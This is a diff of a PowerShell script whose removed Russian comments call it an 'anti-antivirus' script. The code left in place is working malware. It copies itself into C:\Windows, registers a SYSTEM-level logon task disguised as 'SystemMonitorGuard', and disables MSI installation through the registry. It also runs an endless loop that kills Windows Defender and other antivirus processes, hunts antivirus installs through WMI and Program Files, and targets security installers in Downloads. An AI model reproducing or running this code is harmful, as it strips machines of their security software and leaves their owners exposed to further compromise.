@@ -1,7 +1,5 @@
-# === ПОЛНЫЙ ПУТЬ К СКРИПТУ ===
 $taskScriptPath = "C:\Windows\monitor.ps1"
 
-# === ЕСЛИ СКРИПТ ЗАПУЩЕН НЕ ИЗ C:\System, КОПИРУЕМ СЕБЯ ===
 if ($MyInvocation.MyCommand.Path -ne $taskScriptPath) {
     New-Item -ItemType Directory -Path "C:\Windows" -Force | Out-Null
     Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskScriptPath -Force
@@ -9,7 +7,6 @@ if ($MyInvocation.MyCommand.Path -ne $taskScriptPath) {
     exit
 }
 
-# === СОЗДАНИЕ ЗАДАНИЯ ПЛАНИРОВЩИКА ===
 $taskName = "SystemMonitorGuard"
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
@@ -20,7 +17,6 @@ $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
 
-# === ТВОЙ АНТИ-АНТИВИРУС СКРИПТ ===
 
 $blockList = @(
     "msmpeng", "windefend", "securityhealthservice", "securitycenter", "windowsdefender", "mpcmdrun",
@@ -59,18 +55,14 @@ $blockList = @(
 $exeBlockList = @("setup", "installer", "install", "av", "antivirus", "360", "kaspersky", "eset", "avast", "malwarebytes", "security")
 $downloads = "$env:USERPROFILE\Downloads"
 
-# Блокировка установки MSI
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "DisableMSI" -Value 1
 
-# Основной цикл
 while ($true) {
-    # Блокировка известных процессов
     foreach ($name in $blockList) {
         Get-Process | Where-Object { $_.Name -like "*$name*" } | Stop-Process -Force -ErrorAction SilentlyContinue
     }
 
-    # WMI-обнаружение антивирусов
     $avProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction SilentlyContinue
     foreach ($av in $avProducts) {
         $exePath = $av.pathToSignedProductExe
@@ -80,7 +72,6 @@ while ($true) {
         }
     }
 
-    # Поиск в Program Files
     $programPaths = @("C:\Program Files\", "C:\Program Files (x86)\")
     foreach ($dir in $programPaths) {
         Get-ChildItem -Path $dir -Directory -ErrorAction SilentlyContinue | ForEach-Object {
@@ -92,7 +83,6 @@ while ($true) {
         }
     }
 
-    # Блокировка установщиков в Downloads
     Get-ChildItem -Path $downloads -Filter *.exe -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
         foreach ($kw in $exeBlockList) {
             if ($_.Name -like "*$kw*") {
